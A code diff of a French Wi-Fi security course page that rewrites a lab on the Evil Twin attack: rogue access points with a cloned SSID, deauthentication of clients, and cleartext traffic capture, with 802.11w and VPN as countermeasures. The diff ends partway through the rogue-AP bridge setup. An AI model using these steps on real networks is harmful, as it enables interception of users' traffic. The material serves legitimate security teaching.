@@ -201,7 +201,7 @@
                             <h6>Ressources clés</h6>
                             <pre>VM Kali_SecWifi_Labo.ova
 # Extraire le ZIP et entrer dans le dossier
-unzip swfe837_pack_complet.zip && cd swfe837/
+unzip swfe837_pack_complet.zip &amp;&amp; cd swfe837/
 
 # Installation (à lancer depuis swfe837/)
 sudo bash scripts/install_labo.sh
@@ -989,37 +989,6 @@ wlan1: CTRL-EVENT-EAP-FAILURE</div>
                                 </li>
 
                             </ul>
-<div class="step-info" style="margin-top:12px;">
-    <i class="fas fa-lightbulb me-1"></i>
-    <strong>Comportement attendu :</strong> Votre client <strong>ne basculera pas</strong> automatiquement vers le Rogue AP, car il est déjà associé à l’AP légitime. Cependant, si vous forcez un scan ou une déconnexion, il refusera toute association avec l’imposteur – la ligne <code>SSL: Certificate verification failed</code> apparaîtra dans le terminal wpa_supplicant. C’est la preuve que <code>ca_cert</code> bloque l’Evil Twin.
-</div>
-
-<div class="section-sub">Partie E (bonus) — Vérification du nom du serveur</div>
-<div class="theory-box">
-    <h6><i class="fas fa-id-card me-2"></i>Pourquoi regarder le CN ?</h6>
-    <p>En plus de vérifier la chaîne de certification (<code>ca_cert</code>), wpa_supplicant peut contrôler le <strong>nom de domaine</strong> présenté par le serveur RADIUS (paramètre <code>domain_match</code> ou <code>domain_suffix_match</code>). Cela empêche un attaquant disposant d’un certificat signé par une CA publique d’usurper le service. Regardons ce qui se trouve dans le certificat de notre labo.</p>
-</div>
-<ul class="step-list">
-    <li class="step-item">
-        <div class="step-num">E1</div>
-        <div class="step-body">
-            <h6>Inspecter le certificat serveur</h6>
-            <p>Ouvrez un terminal et exécutez :</p>
-            <pre>openssl x509 -in /opt/swfe837/certs/server.pem -text -noout | grep "Subject:"</pre>
-            <div class="step-output"><span class="step-output-label">Exemple de sortie</span>Subject: C = FR, ST = Paris, O = SWFE837 Lab, CN = radius.labo.local</div>
-            <p>Le <strong>CN</strong> (Common Name) est <code>radius.labo.local</code>. C’est ce nom que le client pourrait vérifier en production.</p>
-        </div>
-    </li>
-    <li class="step-item">
-        <div class="step-num">E2</div>
-        <div class="step-body">
-            <h6>Activer la vérification de domaine (optionnel)</h6>
-            <p>Dans votre <code>wpa_supplicant.conf</code>, vous pourriez ajouter :</p>
-            <pre>domain_match="radius.labo.local"</pre>
-            <p>Relancez wpa_supplicant : la connexion ne réussira <strong>que si</strong> le CN correspond exactement. Testez avec une valeur incorrecte pour observer l’échec.</p>
-        </div>
-    </li>
-</ul>
 
                             <div class="checkpoint-box">
                                 <h6><i class="fas fa-check-circle me-2"></i>Critères de validation complets</h6>
@@ -1055,10 +1024,6 @@ wlan1: CTRL-EVENT-EAP-FAILURE</div>
                                     <div class="tr-prob">⚠ FreeRADIUS déjà en cours d'exécution</div>
                                     <div class="tr-sol"><code>sudo pkill freeradius</code> puis relancer avec <code>sudo freeradius -X</code>. Vérifiez aussi qu'aucun autre service ne tourne sur le port 1812 : <code>sudo ss -ulnp | grep 1812</code>.</div>
                                 </div>
-                                <div class="tr-item">
-    <div class="tr-prob">⚠ wpa_supplicant : "Domain mismatch"</div>
-    <div class="tr-sol">Vous avez activé <code>domain_match</code> dans la configuration, mais le CN du certificat serveur ne correspond pas. Vérifiez avec <code>openssl x509 -in /opt/swfe837/certs/server.pem -text -noout | grep Subject:</code> et corrigez la valeur.</div>
-</div>
                             </div>
 
                             <!-- ── Questions ── -->
@@ -1084,97 +1049,27 @@ wlan1: CTRL-EVENT-EAP-FAILURE</div>
                                 </ul>
                             </div>
 
-                        </div>
-                    </div>
-                </div>
-                            <h6>Architecture</h6>
-                            <div class="diagram">
-                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 350" width="800" height="350">
-                                    <defs>
-                                        <filter id="shadow2" x="-2%" y="-2%" width="104%" height="104%">
-                                            <feDropShadow dx="2" dy="2" stdDeviation="2" flood-opacity="0.15"/>
-                                        </filter>
-                                    </defs>
-                                    <rect width="800" height="350" fill="#ffffff" rx="10" />
-                                    <text x="400" y="30" text-anchor="middle" font-family="Arial" font-size="16" font-weight="bold" fill="#1e3c72">TP2 – WPA3-Enterprise (EAP-TLS)</text>
-                                    <!-- Zone légitime -->
-                                    <rect x="30" y="60" width="460" height="250" fill="#e8f5e9" stroke="#2e7d32" stroke-dasharray="8,4" rx="10" />
-                                    <text x="260" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#2e7d32">Infrastructure légitime</text>
-                                    <!-- Client avec certificat -->
-                                    <rect x="50" y="110" width="110" height="60" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow2)"/>
-                                    <text x="105" y="130" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#0d47a1">Client</text>
-                                    <text x="105" y="147" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Certificat client</text>
-                                    <text x="105" y="161" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">wlan0</text>
-                                    <!-- AP WPA3-Enterprise -->
-                                    <rect x="220" y="110" width="130" height="60" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow2)"/>
-                                    <text x="285" y="130" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#b37700">AP WPA3-Ent.</text>
-                                    <text x="285" y="147" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">EAP-TLS</text>
-                                    <text x="285" y="161" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Canal 6</text>
-                                    <!-- Serveur RADIUS -->
-                                    <rect x="400" y="110" width="80" height="60" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow2)"/>
-                                    <text x="440" y="135" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#0d47a1">RADIUS</text>
-                                    <text x="440" y="152" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">FreeRADIUS</text>
-                                    <!-- Flèches légitimes -->
-                                    <line x1="160" y1="140" x2="220" y2="140" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue2)"/>
-                                    <text x="190" y="135" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">1) Assoc.</text>
-                                    <line x1="350" y1="140" x2="400" y2="140" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue2)"/>
-                                    <text x="375" y="135" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">2) Auth.</text>
-                                    <!-- Zone attaquant -->
-                                    <rect x="520" y="60" width="250" height="250" fill="#ffebee" stroke="#c62828" stroke-dasharray="8,4" rx="10" />
-                                    <text x="645" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#c62828">Attaquant</text>
-                                    <!-- Attaquant Evil Twin -->
-                                    <rect x="540" y="110" width="120" height="60" fill="#ffe0e0" stroke="#cc0000" stroke-width="2" rx="6" filter="url(#shadow2)"/>
-                                    <text x="600" y="130" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#b71c1c">Evil Twin</text>
-                                    <text x="600" y="147" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Même SSID</text>
-                                    <text x="600" y="161" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Pas de cert.</text>
-                                    <!-- Flèche échec -->
-                                    <line x1="600" y1="170" x2="600" y2="200" stroke="#cc0000" stroke-width="2" marker-end="url(#arrowRed2)"/>
-                                    <text x="620" y="190" font-family="Arial" font-size="9" fill="#cc0000">Échec</text>
-                                    <!-- Succès -->
-                                    <rect x="250" y="240" width="160" height="40" fill="#c8e6c9" stroke="#2e7d32" stroke-width="2" rx="20" />
-                                    <text x="330" y="265" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#1b5e20">✓ Authentifié</text>
-                                    <line x1="440" y1="170" x2="370" y2="240" stroke="#2e7d32" stroke-width="2" marker-end="url(#arrowGreen2)"/>
-                                    <defs>
-                                        <marker id="arrowBlue2" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#1a3e72"/></marker>
-                                        <marker id="arrowRed2" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc0000"/></marker>
-                                        <marker id="arrowGreen2" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#2e7d32"/></marker>
-                                    </defs>
-                                </svg>
-                            </div>
-                            <h6>Fichiers de configuration fournis</h6>
-                            <pre>hostapd-wpa3-enterprise.conf
-freeradius/clients.conf
-freeradius/eap.conf
-freeradius/users
-
-# Démarrer FreeRADIUS (mode debug)
-sudo freeradius -X
-
-# Tester la connexion RADIUS
-radtest etudiant1 labo2026 127.0.0.1 0 labo_secret_2026
-
-# Démarrer l'AP WPA3-Enterprise
-sudo hostapd /opt/swfe837/configs/hostapd-wpa3-enterprise.conf</pre>
-                            <div class="alert alert-warning small mt-3">
-                                <i class="fas fa-triangle-exclamation"></i> <strong>Point clé :</strong> la vérification du certificat serveur doit être explicitement activée côté client (<code>ca_cert=</code> dans wpa_supplicant.conf). Sans cette ligne, un client se connecte à n'importe quel AP sans vérifier l'identité du RADIUS.
-                            </div>
                             <div class="analysis-box">
                                 <h6><i class="fas fa-question-circle"></i> Questions d'analyse</h6>
                                 <ol>
-                                    <li>Pourquoi un Evil Twin classique échoue-t-il face à WPA3-Enterprise ?</li>
-                                    <li>Quel composant vérifie le certificat du serveur et comment ?</li>
-                                    <li>Quel est l'avantage des certificats par rapport à un secret partagé (PSK) ?</li>
-                                    <li>Proposez une méthode pour déployer les certificats sur les 200 postes de Nexellia.</li>
+                                    <li>Pourquoi un Evil Twin classique échoue-t-il face à WPA3-Enterprise avec EAP-TLS, alors qu'il réussirait face à WPA3-SAE ?</li>
+                                    <li>Quel composant logiciel côté client effectue la vérification du certificat serveur, et quelle ligne de configuration en est responsable ?</li>
+                                    <li>Expliquez ce que vous avez observé à la Partie C : pourquoi le client accepte-t-il quand même une connexion sans <code>ca_cert</code> ?</li>
+                                    <li>Proposez une procédure pour déployer les certificats clients sur les 200 postes de Nexellia en minimisant les interventions manuelles.</li>
                                 </ol>
                             </div>
+
                             <div class="deliverable-box">
                                 <h6><i class="fas fa-box-archive me-1"></i> Livrables pour le portfolio</h6>
                                 <ul>
-                                    <li>Log FreeRADIUS montrant une authentification EAP-TLS réussie</li>
-                                    <li>Tentative d'Evil Twin rejetée (log client ou Wireshark)</li>
-                                    <li>Plan de migration WPA2→WPA3-Enterprise pour Nexellia (contraintes, phasage)</li>
+                                    <li>Log FreeRADIUS (<code>-X</code>) montrant <code>TLS established</code> et <code>Login correct</code></li>
+                                    <li>Log wpa_supplicant montrant <code>Certificate verification succeeded</code> puis <code>CTRL-EVENT-CONNECTED</code></li>
+                                    <li>Capture de la Partie C : connexion sans <code>ca_cert</code> réussie (illustrer la faille)</li>
+                                    <li>Capture de la Partie D : <code>Certificate verification failed</code> sur le Rogue AP</li>
+                                    <li>Analyse écrite ≥ 300 mots : plan de migration WPA2 → WPA3-Enterprise pour Nexellia (contraintes, phasage, coût estimé)</li>
                                 </ul>
                             </div>
+
                         </div>
                     </div>
                 </div>
@@ -1183,7 +1078,7 @@ sudo hostapd /opt/swfe837/configs/hostapd-wpa3-enterprise.conf</pre>
                 <div class="accordion-item">
                     <h2 class="accordion-header" id="heading3">
                         <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse3" aria-expanded="false" aria-controls="collapse3">
-                            <i class="fas fa-user-secret me-2"></i> TP3 – Attaque Evil Twin &amp; durcissement (3h)
+                            <i class="fas fa-user-secret me-2"></i> TP3 – Attaque Evil Twin &amp; durcissement (20mn)
                         </button>
                     </h2>
                     <div id="collapse3" class="accordion-collapse collapse" aria-labelledby="heading3" data-bs-parent="#mainAccordion">
@@ -1196,80 +1091,514 @@ sudo hostapd /opt/swfe837/configs/hostapd-wpa3-enterprise.conf</pre>
 
                             <h5>Objectifs</h5>
                             <ul>
-                                <li>Créer un AP malveillant avec le même SSID (sans chiffrement)</li>
-                                <li>Désauthentifier le client légitime pour provoquer la connexion au Rogue AP</li>
-                                <li>Intercepter des identifiants avec <code>tcpdump</code></li>
-                                <li>Appliquer des contre-mesures : 802.11w, VPN obligatoire</li>
+                                <li>Mettre en place un AP légitime WPA2-PSK et un client connecté</li>
+                                <li>Créer un Rogue AP avec le même SSID (réseau ouvert)</li>
+                                <li>Désauthentifier le client légitime pour forcer sa reconnexion au Rogue AP</li>
+                                <li>Intercepter du trafic HTTP en clair avec <code>tcpdump</code> et Wireshark</li>
+                                <li>Appliquer la contre-mesure 802.11w et mesurer son effet</li>
                             </ul>
-                            <h6>Architecture</h6>
+
+                            <!-- ── Théorie ── -->
+                            <div class="section-sub">Rappel théorique</div>
+                            <div class="theory-box">
+                                <h6><i class="fas fa-book-open me-2"></i>Pourquoi l'Evil Twin fonctionne-t-il ?</h6>
+                                <p>Les OS maintiennent une <strong>liste de réseaux préférés (PNL)</strong>. Quand une interface Wi-Fi détecte un SSID connu, elle s'y associe automatiquement — sans vérifier l'identité de l'AP. En WPA2-PSK et sur les réseaux ouverts, <strong>rien n'authentifie l'AP</strong> auprès du client.</p>
+                                <p>L'attaque se déroule en 4 temps :</p>
+                                <ul>
+                                    <li><strong>Reconnaissance :</strong> identifier le BSSID et le canal de l'AP légitime avec <code>airodump-ng</code>.</li>
+                                    <li><strong>Mise en place du Rogue AP :</strong> diffuser le même SSID sur le même canal, sans chiffrement ou avec un mot de passe connu.</li>
+                                    <li><strong>Désauthentification :</strong> forger des trames de désauth (sans 802.11w) pour couper le client de l'AP légitime.</li>
+                                    <li><strong>Interception :</strong> le client reconnecte automatiquement au Rogue AP — tout son trafic circule en clair.</li>
+                                </ul>
+                            </div>
+
+                            <div class="concept-grid">
+                                <div class="concept-card">
+                                    <div class="ct">PNL (Preferred Network List)</div>
+                                    <p>Liste des réseaux mémorisés par l'OS. La reconnexion automatique est activée par défaut. C'est ce comportement qu'exploite l'Evil Twin.</p>
+                                </div>
+                                <div class="concept-card">
+                                    <div class="ct">Désauthentification 802.11</div>
+                                    <p>Trame de gestion non protégée (sans 802.11w). N'importe qui peut en forger une en usurpant le BSSID de l'AP légitime et couper un client ciblé.</p>
+                                </div>
+                                <div class="concept-card">
+                                    <div class="ct">Rogue AP (AP malveillant)</div>
+                                    <p>AP diffusant le même SSID que l'AP légitime. Peut être ouvert (trafic en clair total) ou proposer un portail captif pour voler des identifiants.</p>
+                                </div>
+                                <div class="concept-card">
+                                    <div class="ct">802.11w (PMF)</div>
+                                    <p>Protected Management Frames. Chiffre et signe les trames de gestion (désauth, disassoc). Rend la désauthentification forgée inopérante — le client ignore les trames non signées.</p>
+                                </div>
+                            </div>
+
+                            <!-- ── Prérequis ── -->
+                            <div class="section-sub">Prérequis</div>
+                            <div class="prereq-box">
+                                <h6><i class="fas fa-list-check me-2"></i>Avant de commencer</h6>
+                                <ul>
+                                    <li>TP2 terminé — snapshot <em>"Après_TP2"</em> créé, <code>sudo bash scripts/reset_labo.sh</code> exécuté</li>
+                                    <li>Interfaces wlan0, wlan1, wlan2, wlan3 disponibles : <code>iw dev</code></li>
+                                    <li>Wordlist disponible : <code>ls /opt/wordlists/rockyou_small.txt</code></li>
+                                </ul>
+                            </div>
+
+                            <!-- ── Affectation interfaces ── -->
+                            <div class="section-sub">Affectation des interfaces pour ce TP</div>
+                            <div class="theory-box">
+                                <h6><i class="fas fa-network-wired me-2"></i>Rôle de chaque interface</h6>
+                                <ul>
+                                    <li><strong>wlan0</strong> → <span style="color:#b37700">AP légitime WPA2-PSK (hostapd)</span> — simule l'infrastructure Nexellia</li>
+                                    <li><strong>wlan1</strong> → <span style="color:#0d47a1">Client légitime (wpa_supplicant)</span> — simule un collaborateur Nexellia</li>
+                                    <li><strong>wlan2</strong> → <span style="color:#c62828">Rogue AP ouvert (hostapd) + mode monitor pour désauth (airmon-ng)</span></li>
+                                    <li><strong>wlan3</strong> → réservé TP4 (IDS)</li>
+                                </ul>
+                                <p style="margin-top:8px"><strong>Note :</strong> wlan2 joue deux rôles successifs dans ce TP — d'abord monitor pour la désauth, puis interface du Rogue AP. <code>reset_labo.sh</code> remet tout en ordre entre les phases.</p>
+                            </div>
+
+                            <!-- ── Schéma ── -->
+                            <div class="section-sub">Architecture de l'attaque</div>
                             <div class="diagram">
                                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 400" width="800" height="400">
                                     <defs>
-                                        <filter id="shadow3" x="-2%" y="-2%" width="104%" height="104%">
-                                            <feDropShadow dx="2" dy="2" stdDeviation="2" flood-opacity="0.15"/>
-                                        </filter>
+                                        <filter id="shadow3"><feDropShadow dx="2" dy="2" stdDeviation="2" flood-opacity="0.15"/></filter>
+                                        <marker id="ab3" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#1a3e72"/></marker>
+                                        <marker id="ar3" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc0000"/></marker>
+                                        <marker id="ao3" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc9900"/></marker>
                                     </defs>
-                                    <rect width="800" height="400" fill="#ffffff" rx="10" />
-                                    <text x="400" y="30" text-anchor="middle" font-family="Arial" font-size="16" font-weight="bold" fill="#1e3c72">TP3 – Attaque Evil Twin</text>
-                                    <!-- Partie supérieure : connexion légitime -->
-                                    <rect x="30" y="60" width="350" height="120" fill="#e8f5e9" stroke="#2e7d32" stroke-dasharray="8,4" rx="10" />
-                                    <text x="205" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#2e7d32">Situation initiale</text>
-                                    <rect x="50" y="100" width="80" height="50" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow3)"/>
-                                    <text x="90" y="130" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#0d47a1">Client</text>
-                                    <rect x="230" y="100" width="100" height="50" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow3)"/>
-                                    <text x="280" y="122" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b37700">AP légitime</text>
-                                    <text x="280" y="140" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">SSID: NexelliaWifi</text>
-                                    <line x1="130" y1="125" x2="230" y2="125" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue3)"/>
-                                    <text x="180" y="120" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">connecté</text>
-                                    <!-- Zone attaque -->
-                                    <rect x="30" y="200" width="740" height="100" fill="#ffebee" stroke="#c62828" stroke-dasharray="8,4" rx="10" />
-                                    <text x="400" y="225" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#c62828">Phase d'attaque</text>
-                                    <rect x="400" y="240" width="110" height="50" fill="#ffe0e0" stroke="#cc0000" stroke-width="2" rx="6" filter="url(#shadow3)"/>
-                                    <text x="455" y="262" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b71c1c">Attaquant</text>
-                                    <text x="455" y="280" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Rogue AP</text>
-                                    <line x1="280" y1="150" x2="280" y2="240" stroke="#cc0000" stroke-width="2" marker-end="url(#arrowRed3)" stroke-dasharray="5,3"/>
-                                    <text x="260" y="195" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc0000">3) Désauth</text>
-                                    <rect x="50" y="240" width="80" height="50" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow3)"/>
-                                    <text x="90" y="270" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#0d47a1">Client</text>
-                                    <line x1="130" y1="265" x2="400" y2="265" stroke="#cc0000" stroke-width="2" marker-end="url(#arrowRed3)"/>
-                                    <text x="265" y="258" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc0000">4) Connexion au Rogue AP</text>
-                                    <rect x="580" y="240" width="140" height="50" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow3)"/>
-                                    <text x="650" y="262" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b37700">Capture</text>
-                                    <text x="650" y="280" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">tcpdump / identifiants</text>
-                                    <line x1="510" y1="265" x2="580" y2="265" stroke="#cc9900" stroke-width="2" marker-end="url(#arrowOrange3)"/>
-                                    <text x="545" y="258" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc9900">5) Intercepte</text>
-                                    <defs>
-                                        <marker id="arrowBlue3" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#1a3e72"/></marker>
-                                        <marker id="arrowRed3" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc0000"/></marker>
-                                        <marker id="arrowOrange3" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc9900"/></marker>
-                                    </defs>
+                                    <rect width="800" height="400" fill="#fff" rx="10"/>
+                                    <text x="400" y="28" text-anchor="middle" font-family="Arial" font-size="15" font-weight="bold" fill="#1e3c72">TP3 – Attaque Evil Twin (chronologie)</text>
+                                    <!-- Phase 1 -->
+                                    <rect x="20" y="50" width="350" height="110" fill="#e8f5e9" stroke="#2e7d32" stroke-dasharray="8,4" rx="10"/>
+                                    <text x="195" y="72" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#2e7d32">① Situation initiale</text>
+                                    <rect x="40" y="88" width="80" height="50" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow3)"/>
+                                    <text x="80" y="117" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#0d47a1">Client</text>
+                                    <rect x="230" y="88" width="120" height="50" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow3)"/>
+                                    <text x="290" y="108" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b37700">AP légitime</text>
+                                    <text x="290" y="126" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">SSID: NexelliaWifi</text>
+                                    <line x1="120" y1="113" x2="230" y2="113" stroke="#1a3e72" stroke-width="2" marker-end="url(#ab3)"/>
+                                    <text x="175" y="108" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">WPA2 connecté</text>
+                                    <!-- Phase 2 -->
+                                    <rect x="20" y="180" width="760" height="110" fill="#ffebee" stroke="#c62828" stroke-dasharray="8,4" rx="10"/>
+                                    <text x="400" y="202" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#c62828">② Phase d'attaque</text>
+                                    <rect x="40" y="218" width="80" height="50" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow3)"/>
+                                    <text x="80" y="247" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#0d47a1">Client</text>
+                                    <rect x="320" y="218" width="140" height="50" fill="#ffe0e0" stroke="#cc0000" stroke-width="2" rx="6" filter="url(#shadow3)"/>
+                                    <text x="390" y="238" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b71c1c">Rogue AP</text>
+                                    <text x="390" y="256" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">SSID: NexelliaWifi (open)</text>
+                                    <rect x="590" y="218" width="160" height="50" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow3)"/>
+                                    <text x="670" y="242" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b37700">tcpdump</text>
+                                    <text x="670" y="258" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">trafic en clair</text>
+                                    <line x1="290" y1="243" x2="320" y2="243" stroke="#cc0000" stroke-width="2" marker-end="url(#ar3)"/>
+                                    <text x="305" y="237" text-anchor="middle" font-family="Arial" font-size="8" fill="#cc0000">désauth</text>
+                                    <line x1="120" y1="250" x2="320" y2="250" stroke="#cc0000" stroke-width="2" marker-end="url(#ar3)"/>
+                                    <text x="220" y="244" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc0000">reconnexion auto</text>
+                                    <line x1="460" y1="243" x2="590" y2="243" stroke="#cc9900" stroke-width="2" marker-end="url(#ao3)"/>
+                                    <text x="525" y="237" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc9900">capture</text>
+                                    <!-- Phase 3 -->
+                                    <rect x="20" y="315" width="760" height="65" fill="#e8f5e9" stroke="#2e7d32" stroke-width="2" rx="10"/>
+                                    <text x="400" y="338" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#166534">③ Contre-mesures</text>
+                                    <text x="220" y="358" text-anchor="middle" font-family="Arial" font-size="10" fill="#166534">802.11w : trames désauth ignorées</text>
+                                    <text x="580" y="358" text-anchor="middle" font-family="Arial" font-size="10" fill="#166534">VPN : trafic chiffré même sur réseau open</text>
                                 </svg>
                             </div>
-                            <h6>Commandes clés</h6>
-                            <pre>sudo ip link set wlan2 up
-sudo ip addr add 192.168.99.1/24 dev wlan2
+
+                            <!-- ── PARTIE A ── -->
+                            <div class="section-sub">Partie A — Mettre en place l'environnement cible</div>
+                            <p class="small text-muted">Ouvrez <strong>4 terminaux</strong>. Les terminaux 1 et 2 resteront ouverts tout au long du TP.</p>
+
+                            <ul class="step-list">
+
+                                <li class="step-item">
+                                    <div class="step-num">A1</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 1 — Démarrer l'AP légitime WPA2-PSK</h6>
+                                        <p>On réutilise la même configuration que le TP1. L'AP simule l'infrastructure Nexellia vulnérable.</p>
+                                        <pre>sudo hostapd /opt/swfe837/configs/hostapd-wpa2-tp1.conf</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>wlan0: interface state UNINITIALIZED->ENABLED
+wlan0: AP-ENABLED</div>
+                                        <p>Vérifiez que le SSID est visible avant de continuer :</p>
+                                        <pre>sudo iwlist wlan1 scan | grep NexelliaWifi</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>ESSID:"NexelliaWifi"</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">A2</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 2 — Connecter le client légitime</h6>
+                                        <pre>sudo ip link set wlan1 up
+sudo systemctl stop wpa_supplicant 2>/dev/null
+sudo pkill -9 wpa_supplicant 2>/dev/null; sleep 1
+sudo rm -rf /run/wpa_supplicant/wlan1
+sudo wpa_supplicant -i wlan1 -c /opt/swfe837/configs/wpa_supplicant-wpa2-tp1.conf</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>wlan1: Associated with 02:00:00:00:00:00
+wlan1: WPA: Key negotiation completed [PTK=CCMP GTK=CCMP]
+wlan1: CTRL-EVENT-CONNECTED - Connection to 02:00:00:00:00:00 completed</div>
+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> Attendez <code>CTRL-EVENT-CONNECTED</code> avant de passer à la suite. Si wpa_supplicant quitte immédiatement, relancez — l'AP n'était peut-être pas encore prêt.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">A3</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Noter le BSSID et la MAC client</h6>
+                                        <p>Ces deux informations sont indispensables pour les étapes de désauthentification. Relevez-les maintenant.</p>
+                                        <pre>iw dev wlan1 link</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>Connected to 02:00:00:00:00:00 (on wlan1)   ← BSSID de l'AP légitime
+        SSID: NexelliaWifi
+        freq: 2437</div>
+                                        <pre>cat /sys/class/net/wlan1/address</pre>
+                                        <div class="step-output"><span class="step-output-label">MAC du client wlan1</span>02:00:00:00:01:00</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> <strong>Notez ces deux valeurs</strong> — BSSID AP et MAC client — vous en aurez besoin aux étapes B2 et B3.</div>
+                                    </div>
+                                </li>
+
+                            </ul>
+
+                            <div class="checkpoint-box">
+                                <h6><i class="fas fa-check-circle me-2"></i>Validation Partie A</h6>
+                                <ul>
+                                    <li>Terminal 1 : hostapd affiche <code>AP-ENABLED</code></li>
+                                    <li>Terminal 2 : wpa_supplicant affiche <code>CTRL-EVENT-CONNECTED</code></li>
+                                    <li>BSSID de l'AP et MAC du client notés</li>
+                                </ul>
+                            </div>
+
+                            <!-- ── PARTIE B ── -->
+                            <div class="section-sub">Partie B — Mettre en place le Rogue AP et capturer le trafic</div>
+
+                            <ul class="step-list">
+
+                                <li class="step-item">
+                                    <div class="step-num">B1</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Créer le bridge réseau pour le Rogue AP</h6>
+                                        <p>Sans bridge, hostapd en mode AP ne relaie pas les paquets de la machine vers les clients — le trafic est unidirectionnel. On crée un bridge <code>br-evil</code> qui porte l'IP du Rogue AP et permet la communication bidirectionnelle.</p>
+                                        <pre># Créer et activer le bridge
+sudo ip link add br-evil type bridge
+sudo ip link set br-evil up
+
+# Attribuer l'IP au bridge (pas à wlan2 directement)
